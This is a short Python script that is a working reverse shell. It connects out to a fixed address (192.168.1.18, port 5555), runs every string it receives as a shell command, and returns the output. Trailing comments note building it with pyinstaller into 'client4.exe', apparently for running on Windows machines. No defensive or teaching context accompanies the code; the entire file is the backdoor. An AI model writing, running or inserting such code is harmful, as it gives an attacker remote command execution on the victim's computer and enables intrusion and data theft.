import socket
import subprocess
import os

s = socket.socket()
host = '192.168.1.18'
port = 5555

s.connect((host,port))

#dir = os.getcwd()
#s.send(dir.encode())

while True:
    data = s.recv(8192)
    rdata = data.decode()
    if not data:
        break
    cmd = subprocess.Popen(rdata,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    cmd_bytes = cmd.stdout.read() + cmd.stderr.read()
    #cmd_r = str(cmd_bytes)
    #dd = str.encode(cmd_bytes)
    #print(dd)
    s.send(cmd_bytes)
    
s.close()


#pyinstaller
#C:\Users\mohamed_adel\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\LocalCache\local-packages\Python310\Scripts

#client4.exe
#C:\Users\mohamed_adel\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\LocalCache\local-packages\Python310\Scripts\dist








